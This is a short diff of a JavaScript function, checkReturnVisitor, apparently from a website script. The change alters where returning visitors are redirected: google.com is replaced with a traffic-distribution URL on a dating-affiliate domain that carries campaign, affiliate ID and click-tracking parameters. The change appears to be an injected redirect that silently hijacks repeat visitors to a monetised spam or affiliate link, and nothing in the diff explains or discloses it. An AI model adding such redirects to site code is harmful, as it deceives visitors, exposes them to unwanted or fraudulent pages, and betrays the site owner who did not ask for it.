@@ -7,7 +7,7 @@ function checkReturnVisitor() {
     
     if (hasVisited) {
         // User has visited before, redirect immediately
-        window.location.href = 'https://google.com';
+        window.location.href = 'https://datersluv.com/tds/ae?tds_campaign=s7090kru&tdsId=s7090kru_r&s1=int&utm_source=int&utm_sub=opnfnl&utm_term=2&clickid=%7Bclickid%7D&subid=%7Bsubid%7D&subid2=%7Bsubid2%7D&affid=cf9f103c';
         return true;
     }
     
